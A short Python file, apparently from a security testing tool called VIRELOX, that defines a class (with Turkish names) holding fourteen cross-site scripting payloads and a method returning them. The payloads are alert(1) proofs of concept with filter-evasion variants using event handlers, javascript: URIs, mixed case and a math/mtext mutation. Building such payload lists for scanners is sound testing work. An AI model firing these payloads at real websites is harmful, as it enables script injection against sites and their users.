"""VIRELOX XSS Payload Havuzu"""

class XSSPayloadHavuzu:
    PAYLOADLAR = [
        "<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<video src=1 onerror=alert(1)>",
        "<audio src=1 onerror=alert(1)>",
        "<math><mtext></p><img src=1 onerror=alert(1)>",
        "jaVasCript:alert(1)//%0D%0A",
    ]

    def hepsini_al(self):
        return self.PAYLOADLAR
